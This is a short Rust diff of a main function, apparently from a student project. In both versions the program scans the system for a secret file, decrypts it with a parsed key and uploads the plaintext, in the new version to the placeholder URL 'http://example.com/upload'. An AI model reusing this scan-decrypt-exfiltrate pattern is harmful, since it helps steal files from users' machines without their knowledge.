@@ -1,18 +1,17 @@
 use P3::*;
-#[tokio::main]
 
-async fn main() {
-    let file_path = "c2VjcmV0X2ZpbGUudHh0.encr";
-    let server_url = "https://127.0.0.1";
-    let github_link = "https://github.com/lyssairene/Project3";
+fn main() {
+    let file_paths = scan_system().expect("Failed to scan system");
+    let secret_key = parse_secret().expect("Failed to parse secret key");
 
-    if let Ok(data) = scan_system(file_path).await {
-        let secret_key = parse_secret().await.unwrap();
-        let decrypted_data = decrypt_file(&data, &secret_key);
-        if let Err(e) = send_contents(decrypted_data.await, server_url, &secret_key, github_link).await {
-            eprintln!("Error: {}", e);
+    for file_path in file_paths {
+        if file_path.ends_with("special_file.txt") {
+            let mut file = File::open(&file_path).expect("Failed to open special_file.txt");
+            let mut encrypted_data = Vec::new();
+            file.read_to_end(&mut encrypted_data).expect("Failed to read special_file.txt");
+
+            let decrypted_data = decrypt_file(&encrypted_data, &secret_key);
+            send_contents(decrypted_data, "http://example.com/upload").expect("Failed to send contents");
         }
-    } else {
-        eprintln!("Failed to read file.");
     }
 }
